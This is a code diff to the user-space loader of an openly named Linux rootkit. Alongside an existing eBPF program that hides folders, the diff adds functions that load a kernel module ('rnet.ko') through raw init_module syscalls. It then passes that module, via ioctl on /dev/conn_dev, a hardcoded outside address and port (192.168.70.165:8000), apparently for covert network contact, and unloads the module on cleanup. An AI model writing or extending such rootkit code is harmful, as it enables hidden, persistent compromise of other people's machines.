@@ -1,3 +1,4 @@
+#include "rootkit/Utils.hpp"
 #include <csignal>
 #include <cstdint>
 #include <cstdio>
@@ -6,6 +7,9 @@
 #include <iostream>
 #include <string>
 #include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/ioctl.h>
 
 extern "C" {
 #include "common.h"
@@ -13,6 +17,13 @@ extern "C" {
 #include <bpf/bpf.h>
 #include <bpf/libbpf.h>
 }
+
+#define RNET_NAME "rnet"
+// #define RNET_PATH "../src/module/bin/" RNET_NAME ".ko"
+#define RNET_PATH "./" RNET_NAME ".ko"
+
+# define init_module(mod, len, opts) syscall(__NR_init_module, mod, len, opts)
+# define delete_module(mod, flags) syscall(__NR_delete_module, mod, flags)
 
 struct SetupData {
     uint64_t inode;
@@ -32,6 +43,10 @@ struct ring_buffer * get_msg_ring_buffer(
 );
 SetupData get_setup_data();
 
+bool load_kernel_module(const std::string& module_path);
+void send_data_to_kernel_module(const conn_info& data);
+bool unload_kernel_module(const std::string& module_name);
+
 static int rb_event(void * ctx, void * data, size_t data_sz) {
     const struct event * e = reinterpret_cast<const struct event *>(data);
     printf("Hidden Folder: %s, inode: %llu\n", (char *)e->filename, e->inode);
@@ -45,6 +60,20 @@ int main(int argc, char ** argv) {
 
     // Load bpf program and its syscalls
     struct rootkit_bpf * obj = setup_bpf(get_setup_data());
+    load_kernel_module(RNET_PATH);
+
+    // Prepare data to send
+    struct conn_info data;
+    data.dport = 8000;
+
+    auto ip = rootkit::utils::convert_ip("192.168.70.165");
+    if (!ip.has_value())
+        return 1;
+
+    data.daddr = ip.value();
+    data.id = 1;
+
+    send_data_to_kernel_module(data);
 
     // Get ring buffer for messages from kernel space
     // All messages will be processed by rb_event function
@@ -67,8 +96,65 @@ int main(int argc, char ** argv) {
     return 0;
 }
 
+void send_data_to_kernel_module(const conn_info& data) {
+    int fd = open("/dev/conn_dev", O_RDWR);
+    if (fd < 0) {
+        perror("Failed to open device");
+        return;
+    }
+
+    // Send data via ioctl
+    if (ioctl(fd, IOCTL_SEND_DATA, &data) < 0) {
+        perror("ioctl failed");
+        close(fd);
+    }
+    close(fd);
+}
+
+bool load_kernel_module(const std::string& module_path) {
+    int fd = open(module_path.c_str(), O_RDONLY);
+    if (fd < 0) return false;
+
+    // Get file size
+    off_t size = lseek(fd, 0, SEEK_END);
+    lseek(fd, 0, SEEK_SET);
+
+    // Read module into memory
+    uint8_t * module_data = (uint8_t *) malloc(size);
+    read(fd, module_data, size);
+    close(fd);
+
+    if (init_module(module_data, size, "") < 0) {
+        perror("init_module");
+        // Check if the error is permission vs. module state
+        if (errno == EPERM) {
+            // Operation not permitted - could be SELinux, secure boot, or capability issue
+            fprintf(stderr, "Permission denied - check SELinux status, secure boot, or capabilities\n");
+        } else if (errno == EEXIST) {
+            fprintf(stderr, "Module already loaded\n");
+        } else if (errno == ENOEXEC) {
+            fprintf(stderr, "Module format error\n");
+        }
+        exit(-1);
+        return false;
+    }
+
+    return true;
+}
+
+bool unload_kernel_module(const std::string& module_name) {
+    // if (syscall(SYS_delete_module, RNET_NAME, O_NONBLOCK) != 0) {
+    if (delete_module(RNET_NAME, O_NONBLOCK) < 0) {
+        perror("Error unloading module");
+        return false;
+    }
+
+    return true;
+}
+
 void clean(struct rootkit_bpf * obj) {
     rootkit_bpf__destroy(obj);
+    unload_kernel_module(RNET_NAME);
 }
 
 struct rootkit_bpf * setup_bpf(SetupData data) {
